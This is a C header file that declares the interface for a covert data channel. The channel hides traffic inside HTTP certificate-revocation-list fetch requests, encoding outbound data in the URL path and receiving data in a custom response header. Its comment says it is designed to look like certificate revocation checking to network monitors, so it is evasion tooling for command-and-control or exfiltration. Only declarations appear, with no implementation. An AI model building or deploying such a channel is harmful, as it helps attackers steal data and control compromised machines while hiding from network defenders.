#pragma once
#include <stdint.h>
#include <stddef.h>
#include <uv.h>
#include "util.h"

/*
 * CRL covert channel.
 * Tunnels data over HTTP CRL fetch requests.
 * Encodes data in the URL path; server returns data in
 * X-Tunnel-Data response header.
 * Looks like certificate revocation checking to network monitors.
 */

typedef struct crl_channel_s crl_channel_t;
typedef void (*crl_recv_cb_t)(const uint8_t *data, size_t len, void *userdata);

struct crl_channel_s {
    uv_loop_t    *loop;
    uv_tcp_t      tcp;
    uv_connect_t  connect_req;
    char          host[256];
    uint16_t      port;
    char          domain[256];
    crl_recv_cb_t on_recv;
    void         *userdata;
    int           connected;
    uint8_t       recv_buf[8192];
    size_t        recv_len;
    uint32_t      req_seq;
    uint8_t       send_buf[4096];
    size_t        send_len;
    uv_write_t    write_req;
};

err_t crl_channel_init(crl_channel_t *ch, uv_loop_t *loop,
                       const char *host, uint16_t port,
                       const char *domain);
err_t crl_channel_connect(crl_channel_t *ch);
/* Send: HTTP GET /crl/{session_id}/{base36_data}.crl
 * Response: HTTP with X-Tunnel-Data header containing hex-encoded downstream */
err_t crl_channel_send(crl_channel_t *ch,
                       const uint8_t *data, size_t len);
void  crl_channel_free(crl_channel_t *ch);
